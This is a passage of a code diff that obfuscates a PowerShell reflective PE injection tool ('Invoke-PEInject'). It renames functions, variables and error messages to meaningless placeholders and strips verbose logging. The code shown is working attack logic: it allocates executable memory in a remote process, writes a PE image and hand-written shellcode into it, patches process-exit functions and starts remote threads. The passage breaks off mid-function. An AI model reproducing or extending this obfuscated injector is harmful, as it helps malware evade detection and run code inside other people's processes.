+                $VAR0257 = $VAR0256
                 
                 
-                [Byte[]]$Shellcode1 = @(0xbb)
-                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
+                [Byte[]]$VAR0235 = @(0xbb)
+                [Byte[]]$VAR0236 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
                 
-                if ($PtrSize -eq 8) {
-                    [Byte[]]$Shellcode1 = @(0x48, 0xbb)
-                    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
+                if ($VAR0163 -eq 8) {
+                    [Byte[]]$VAR0235 = @(0x48, 0xbb)
+                    [Byte[]]$VAR0236 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
                 }
-                [Byte[]]$Shellcode3 = @(0xff, 0xd3)
-                $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
+                [Byte[]]$VAR0258 = @(0xff, 0xd3)
+                $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length + $VAR0163 + $VAR0258.Length
     
-                [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
-                if ($ExitThreadAddr -eq [IntPtr]::Zero) {
-                    Throw "ExitThread address not found"
+                [IntPtr]$VAR0259 = $VAR0042.FUN036.Invoke($VAR0168, "ExitThread")
+                if ($VAR0259 -eq [IntPtr]::Zero) {
+                    Throw "ERROR47"
                 }
     
-                $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+                $Success = $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
                 if ($Success -eq $false) {
-                    Throw "Call to VirtualProtect failed"
+                    Throw "ERROR48"
                 }
     
                 
-                $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
-                $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
-                $ReturnArray += , ($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
+                $VAR0260 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
+                $VAR0042.FUN033.Invoke($VAR0260, $VAR0256, [UInt64]$VAR0237) | Out-Null
+                $VAR0229 += , ($VAR0256, $VAR0260, $VAR0237)
     
                 
                 
-                Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
-                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
-                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
-                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
-                Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
-                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
-                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
-                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
-                Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp
+                FUN010 -Bytes $VAR0235 -VAR0129 $VAR0257
+                $VAR0257 = FUN005 $VAR0257 ($VAR0235.Length)
+                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0228, $VAR0257, $false)
+                $VAR0257 = FUN005 $VAR0257 $VAR0163
+                FUN010 -Bytes $VAR0236 -VAR0129 $VAR0257
+                $VAR0257 = FUN005 $VAR0257 ($VAR0236.Length)
+                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0259, $VAR0257, $false)
+                $VAR0257 = FUN005 $VAR0257 $VAR0163
+                FUN010 -Bytes $VAR0258 -VAR0129 $VAR0257
     
-                $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+                $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
             }
             
     
-            Write-Output $ReturnArray
+            Write-Output $VAR0229
         }
 
         
         
-        Function Copy-ArrayOfMemAddresses {
+        Function FUN026 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Array[]]
-                $CopyInfo,
+                $VAR0261,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions,
+                $VAR0042,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants
+                $VAR0041
             )
 
-            [UInt32]$OldProtectFlag = 0
-            foreach ($Info in $CopyInfo) {
-                $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+            [UInt32]$VAR0226 = 0
+            foreach ($VAR0262 in $VAR0261) {
+                $Success = $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
                 if ($Success -eq $false) {
-                    Throw "Call to VirtualProtect failed"
+                    Throw "ERROR50"
                 }
 
-                $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
+                $VAR0042.FUN033.Invoke($VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]) | Out-Null
 
-                $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+                $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
             }
         }
 
@@ -1939,42 +1923,42 @@ function Invoke-PEInject {
         
         
         
-        Function Get-MemoryProcAddress {
+        Function FUN027 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
-                $PEHandle,
+                $VAR0263,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [String]
-                $FunctionName
+                $VAR0187
             )
 
-            $Win32Types = Get-Win32Types
-            $Win32Constants = Get-Win32Constants
-            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+            $VAR010 = FUN001
+            $VAR0041 = FUN002
+            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
 
             
-            if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0) {
+            if ($VAR0126.CONST031.CONST122.CONST107.Size -eq 0) {
                 return [IntPtr]::Zero
             }
-            $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
-            $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
+            $VAR0264 = FUN005 ($VAR0263) ($VAR0126.CONST031.CONST122.CONST107.CONST074)
+            $VAR0265 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0264, [Type]$VAR010.CONST155)
 
-            for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++) {
+            for ($i = 0; $i -lt $VAR0265.CONST159; $i++) {
                 
-                $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
-                $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
-                $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
+                $VAR0266 = FUN005 ($VAR0263) ($VAR0265.CONST161 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+                $VAR0267 = FUN005 ($VAR0263) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0266, [Type][UInt32]))
+                $VAR0268 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0267)
 
-                if ($Name -ceq $FunctionName) {
+                if ($VAR0268 -ceq $VAR0187) {
                     
                     
-                    $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
-                    $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
-                    $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
-                    $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
-                    return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
+                    $VAR0269 = FUN005 ($VAR0263) ($VAR0265.CONST162 + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
+                    $VAR0270 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0269, [Type][UInt16])
+                    $VAR0271 = FUN005 ($VAR0263) ($VAR0265.CONST160 + ($VAR0270 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+                    $VAR0272 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0271, [Type][UInt32])
+                    return FUN005 ($VAR0263) ($VAR0272)
                 }
             }
 
@@ -1982,264 +1966,242 @@ function Invoke-PEInject {
         }
 
 
-        Function Invoke-MemoryLoadLibrary {
+        Function FUN028 {
             Param(
                 [Parameter( Position = 0, Mandatory = $true )]
                 [Byte[]]
-                $PEBytes,
+                $VAR001,
 
                 [Parameter(Position = 1, Mandatory = $false)]
                 [String]
-                $ExeArgs,
+                $VAR004,
 
                 [Parameter(Position = 2, Mandatory = $false)]
                 [IntPtr]
-                $RemoteProcHandle,
+                $VAR0161,
 
                 [Parameter(Position = 3)]
                 [Bool]
-                $ForceASLR = $false
+                $VAR007 = $false
             )
 
-            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 
             
-            $Win32Constants = Get-Win32Constants
-            $Win32Functions = Get-Win32Functions
-            $Win32Types = Get-Win32Types
+            $VAR0041 = FUN002
+            $VAR0042 = FUN003
+            $VAR010 = FUN001
 
-            $RemoteLoading = $false
-            if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
-                $RemoteLoading = $true
+            $VAR0210 = $false
+            if (($VAR0161 -ne $null) -and ($VAR0161 -ne [IntPtr]::Zero)) {
+                $VAR0210 = $true
             }
 
             
-            Write-Verbose "Getting basic PE information from the file"
-            $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
-            $OriginalImageBase = $PEInfo.OriginalImageBase
-            $NXCompatible = $true
-            if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) {
-                Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
-                $NXCompatible = $false
+            $VAR0126 = FUN016 -VAR001 $VAR001 -VAR010 $VAR010
+            $VAR0196 = $VAR0126.VAR0196
+            $VAR0273 = $true
+            if (([Int] $VAR0126.CONST035 -band $VAR0041.CONST024) -ne $VAR0041.CONST024) {
+
+                $VAR0273 = $false
             }
 
             
-            $Process64Bit = $true
-            if ($RemoteLoading -eq $true) {
-                $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-                $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
-                if ($Result -eq [IntPtr]::Zero) {
-                    Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
+            $VAR0274 = $true
+            if ($VAR0210 -eq $true) {
+                $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
+                $VAR0144 = $VAR0042.FUN036.Invoke($VAR0168, "IsWow64Process")
+                if ($VAR0144 -eq [IntPtr]::Zero) {
+                    Throw "ERROR52"
                 }
 
-                [Bool]$Wow64Process = $false
-                $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
+                [Bool]$VAR0275 = $false
+                $Success = $VAR0042.FUN055.Invoke($VAR0161, [Ref]$VAR0275)
                 if ($Success -eq $false) {
-                    Throw "Call to IsWow64Process failed"
+                    Throw "ERROR53"
                 }
 
-                if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
-                    $Process64Bit = $false
+                if (($VAR0275 -eq $true) -or (($VAR0275 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
+                    $VAR0274 = $false
                 }
 
                 
-                $PowerShell64Bit = $true
+                $VAR0276 = $true
                 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
-                    $PowerShell64Bit = $false
+                    $VAR0276 = $false
                 }
-                if ($PowerShell64Bit -ne $Process64Bit) {
-                    throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
+                if ($VAR0276 -ne $VAR0274) {
+                    throw "ERROR54"
                 }
             }
             else {
                 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
-                    $Process64Bit = $false
+                    $VAR0274 = $false
                 }
             }
-            if ($Process64Bit -ne $PEInfo.PE64Bit) {
-                Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
+            if ($VAR0274 -ne $VAR0126.CONST032) {
+                Throw "ERROR55"
             }
 
             
-            Write-Verbose "Allocating memory for the PE and write its headers to memory"
 
             
-            [IntPtr]$LoadAddr = [IntPtr]::Zero
-            $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
-            if ((-not $ForceASLR) -and (-not $PESupportsASLR)) {
-                Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
-                [IntPtr]$LoadAddr = $OriginalImageBase
+            [IntPtr]$VAR0277 = [IntPtr]::Zero
+            $VAR0278 = ([Int] $VAR0126.CONST035 -band $VAR0041.CONST023) -eq $VAR0041.CONST023
+            if ((-not $VAR007) -and (-not $VAR0278)) {
+                Write-Warning "ERROR56" -WarningAction Continue
+                [IntPtr]$VAR0277 = $VAR0196
             }
-            elseif ($ForceASLR -and (-not $PESupportsASLR)) {
-                Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
-            }
+            
 
-            if ($ForceASLR -and $RemoteLoading) {
-                Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
-            }
-            if ($RemoteLoading -and (-not $PESupportsASLR)) {
-                Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
-            }
 
-            $PEHandle = [IntPtr]::Zero              
-            $EffectivePEHandle = [IntPtr]::Zero     
-            if ($RemoteLoading -eq $true) {
+            $VAR0263 = [IntPtr]::Zero              
+            $VAR0279 = [IntPtr]::Zero     
+            if ($VAR0210 -eq $true) {
                 
-                $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+                $VAR0263 = $VAR0042.FUN031.Invoke([IntPtr]::Zero, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
 
                 
-                $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-                if ($EffectivePEHandle -eq [IntPtr]::Zero) {
-                    Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
+                $VAR0279 = $VAR0042.FUN032.Invoke($VAR0161, $VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+                if ($VAR0279 -eq [IntPtr]::Zero) {
+                    Throw "ERROR57"
                 }
             }
             else {
-                if ($NXCompatible -eq $true) {
-                    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+                if ($VAR0273 -eq $true) {
+                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
                 }
                 else {
-                    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
                 }
-                $EffectivePEHandle = $PEHandle
+                $VAR0279 = $VAR0263
             }
 
-            [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
-            if ($PEHandle -eq [IntPtr]::Zero) {
-                Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
+            [IntPtr]$VAR0128 = FUN005 ($VAR0263) ([Int64]$VAR0126.CONST033)
+            if ($VAR0263 -eq [IntPtr]::Zero) {
+                Throw "ERROR58."
             }
-            [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
+            [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0263, $VAR0126.CONST034) | Out-Null
 
 
             
-            Write-Verbose "Getting detailed PE information from the headers loaded in memory"
-            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-            $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
-            $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
-            Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
+            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST038 -Value $VAR0128
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST039 -Value $VAR0279
+            
+
+            FUN020 -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010
 
 
             
-            Write-Verbose "Copy PE sections in to memory"
-            Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
+            FUN021 -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010
 
 
             
-            Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
-            Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
-
-
-            
-            Write-Verbose "Import DLL's needed by the PE we are loading"
-            if ($RemoteLoading -eq $true) {
-                Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
+            if ($VAR0210 -eq $true) {
+                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
             }
             else {
-                Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
             }
 
 
             
-            if ($RemoteLoading -eq $false) {
-                if ($NXCompatible -eq $true) {
-                    Write-Verbose "Update memory protection flags"
-                    Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
+            if ($VAR0210 -eq $false) {
+                if ($VAR0273 -eq $true) {
+
+                    FUN024 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                 }
-                else {
-                    Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
-                }
+                
             }
-            else {
-                Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
-            }
+            
 
 
             
-            if ($RemoteLoading -eq $true) {
-                [UInt32]$NumBytesWritten = 0
-                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
+            if ($VAR0210 -eq $true) {
+                [UInt32]$VAR0167 = 0
+                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0279, $VAR0263, [UIntPtr]($VAR0126.CONST033), [Ref]$VAR0167)
                 if ($Success -eq $false) {
-                    Throw "Unable to write shellcode to remote process memory."
+                    Throw "ERROR59"
                 }
             }
 
 
             
-            if ($PEInfo.FileType -ieq "DLL") {
-                if ($RemoteLoading -eq $false) {
-                    Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
-                    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-                    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
-                    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+            if ($VAR0126.CONST037 -ieq "Library") {
+                if ($VAR0210 -eq $false) {
 
-                    $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
+                    $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
+                    $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+                    $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)
+
+                    $VAR0282.Invoke($VAR0126.VAR0263, 1, [IntPtr]::Zero) | Out-Null
                 }
                 else {
-                    $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+                    $VAR0280 = FUN005 ($VAR0279) ($VAR0126.CONST031.CONST122.CONST060)
 
-                    if ($PEInfo.PE64Bit -eq $true) {
+                    if ($VAR0126.CONST032 -eq $true) {
                         
-                        $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
-                        $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
-                        $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+                        $VAR0283 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+                        $VAR0284 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
+                        $VAR0285 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                     }
                     else {
                         
-                        $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
-                        $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
-                        $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
+                        $VAR0283 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
+                        $VAR0284 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
+                        $VAR0285 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                     }
-                    $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
-                    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
-                    $SCPSMemOriginal = $SCPSMem
+                    $VAR0171 = $VAR0283.Length + $VAR0284.Length + $VAR0285.Length + ($VAR0163 * 2)
+                    $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
+                    $VAR0173 = $VAR0172
 
-                    Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
-                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
-                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
-                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-                    Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
-                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
-                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
-                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-                    Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
-                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
+                    FUN010 -Bytes $VAR0283 -VAR0129 $VAR0172
+                    $VAR0172 = FUN005 $VAR0172 ($VAR0283.Length)
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0279, $VAR0172, $false)
+                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+                    FUN010 -Bytes $VAR0284 -VAR0129 $VAR0172
+                    $VAR0172 = FUN005 $VAR0172 ($VAR0284.Length)
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0280, $VAR0172, $false)
+                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+                    FUN010 -Bytes $VAR0285 -VAR0129 $VAR0172
+                    $VAR0172 = FUN005 $VAR0172 ($VAR0285.Length)
 
-                    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-                    if ($RSCAddr -eq [IntPtr]::Zero) {
-                        Throw "Unable to allocate memory in the remote process for shellcode"
-                    }
-
-                    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
-                    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
-                        Throw "Unable to write shellcode to remote process memory."
+                    $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+                    if ($VAR0178 -eq [IntPtr]::Zero) {
+                        Throw "ERROR60"
                     }
 
-                    $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
-                    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
-                    if ($Result -ne 0) {
-                        Throw "Call to CreateRemoteThread to call GetProcAddress failed."
